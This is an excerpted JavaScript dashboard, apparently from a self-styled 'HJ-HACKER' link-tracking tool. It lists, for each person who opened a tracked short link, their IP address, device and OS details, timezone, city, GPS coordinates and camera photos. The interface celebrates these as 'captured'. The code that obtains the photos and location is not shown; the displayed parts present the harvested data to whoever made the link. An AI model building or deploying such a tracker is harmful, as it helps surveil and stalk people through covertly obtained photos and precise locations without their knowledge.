...
// ========== COMPLETE DEVICE INFO CAPTURE (FIXED) ==========
async function captureFullDeviceInfo() {
    ...
    if (ua.includes('iPhone')) {
        ...
        info.os_version = match ? match[1].replace(/_/g, '.') : 'Unknown';
...
async function showRecent() {
    ...
    try {
        ...
        for (const [code] of Object.entries(snapshot.val() || {})) {
            const aSnapshot = await database.ref(`analytics/${code}`).orderByKey().limitToLast(30).get();
            aSnapshot.forEach(a => {
                const d = a.val();
                all.push({
                    ...
                    timestamp: d.created_at, camera: d.captured_image, location: d.latitude
                });
            });
        }
        ...
        const html = recent.map(v => `
            <div class="data-item">
                ...
                ${v.camera ? `<div class="data-item-stats green-highlight"><i class="fas fa-camera"></i> Camera captured! <button class="data-btn-sm" onclick="viewPhoto('${v.camera}')">View Photo</button></div>` : ''}
                ${v.location ? `<div class="data-item-stats green-highlight"><i class="fas fa-location-dot"></i> Location captured! <i class="fas fa-map-marker-alt"></i> GPS: ${v.location}</div>` : ''}
                <div class="data-item-actions">
...
window.viewAnalytics = async (code) => {
    ...
    try {
        ...
        let html = `<div class="stats-grid"><div class="stat-card"><div class="stat-value">${analytics.length}</div><div class="stat-label"><i class="fas fa-users"></i> Visitors</div></div><div class="stat-card"><div class="stat-value">${new Set(analytics.map(a=>a.ip_address)).size}</div><div class="stat-label"><i class="fas fa-globe"></i> Unique IPs</div></div></div>`;
        html += `<div style="margin-bottom:12px;padding:8px;background:#00000030;border-radius:8px;"><div style="font-size:0.7rem;word-break:break-all"><i class="fas fa-link"></i> ${linkData?.long_url || 'N/A'}</div>${linkData?.password ? '<div style="font-size:0.7rem"><i class="fas fa-lock"></i> Password Protected</div>' : ''}</div>`;
        ...
        if (analytics.length === 0) {
            ...
            html += analytics.map(v => `
                <div class="data-item">
                    <div class="data-item-header"><span><i class="fas fa-globe"></i> ${v.ip_address || 'Unknown'}</span><span class="data-item-date"><i class="fas fa-calendar"></i> ${new Date(v.created_at).toLocaleString()}</span></div>
                    ...
                    <div class="data-item-stats"><strong><i class="fab fa-${(v.browser || 'chrome').toLowerCase()}"></i> Browser:</strong> ${v.browser || 'Unknown'} | <strong>OS:</strong> ${v.os || 'Unknown'} ${v.os_version ? `(v${v.os_version})` : ''}</div>
                    ...
                    <div class="data-item-stats"><strong><i class="fas fa-clock"></i> Timezone:</strong> ${v.timezone || 'Unknown'} | <strong>Orientation:</strong> ${v.orientation || 'Unknown'}</div>
                    ${v.city ? `<div class="data-item-stats"><strong><i class="fas fa-map-marker-alt"></i> Location:</strong> ${v.city}${v.country ? `, ${v.country}` : ''}</div>` : ''}
                    ${v.latitude ? `<div class="data-item-stats green-highlight"><strong><i class="fas fa-location-dot"></i> GPS:</strong> ${v.latitude.toFixed(4)}, ${v.longitude?.toFixed(4)}</div>` : ''}
                    ${v.captured_image ? `<div class="data-item-stats green-highlight"><i class="fas fa-camera"></i> Photo captured! <button class="data-btn-sm" onclick="viewPhoto('${v.captured_image}')">View Photo</button></div>` : ''}
                </div>
            `).join('');
        }
...
window.viewPhoto = (imageData) => {
    ...
    if (modal && img && imageData && imageData !== 'data:,') {
        img.src = imageData;
...
function downloadPhoto() {
    const img = document.getElementById('photoModalImage');
    if (img && img.src && img.src !== '' && img.src !== 'data:,') {
...
document.querySelectorAll('.bottom-nav-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        ...
        if (tab === 'create') {
            ...
            updateDisplay('Click any button to view data', 'fa-fingerprint', '<div class="empty-data"><i class="fas fa-fingerprint"></i><p>Tap LINKS, STATS, or RECENT below</p></div>');
...
document.getElementById('copyBtn')?.addEventListener('click', () => { const link = document.getElementById('shortLink')?.textContent; if(link) copyToClipboard(link); });
...
console.log('🔥 HJ-HACKER FINAL - Fully Working with Green Highlights for Captures!');
